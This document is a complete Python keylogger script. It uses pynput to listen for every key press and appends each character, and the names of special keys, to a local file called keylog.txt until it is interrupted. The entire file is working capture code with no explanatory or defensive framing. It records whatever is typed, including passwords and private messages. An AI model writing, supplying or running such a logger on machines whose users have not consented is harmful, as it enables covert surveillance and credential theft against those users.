import pynput
from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

class KeyLogger:
    def __init__(self):
        self.log_file_handle = open(log_file, "a")

    def log_key_press(self, key):
        try:
            key_char = key.char if key.char else " "  
            if key == Key.space: 
                key_char = " "
           # print(f"Logged Key: {key_char}")
            self.log_file_handle.write(key_char)  
            self.log_file_handle.flush()
        except AttributeError:
           # print(f"Special Key Logged: {key}")
            self.log_file_handle.write(f"[{key}]")  
            self.log_file_handle.flush()

    def start_logging(self):
        with Listener(on_press=self.log_key_press) as listener:
            listener.join()

    def close_log_file(self):
        self.log_file_handle.close()

if __name__ == "__main__":
    keylogger_instance = KeyLogger()
    try:
        keylogger_instance.start_logging()
    except KeyboardInterrupt:
        keylogger_instance.close_log_file()
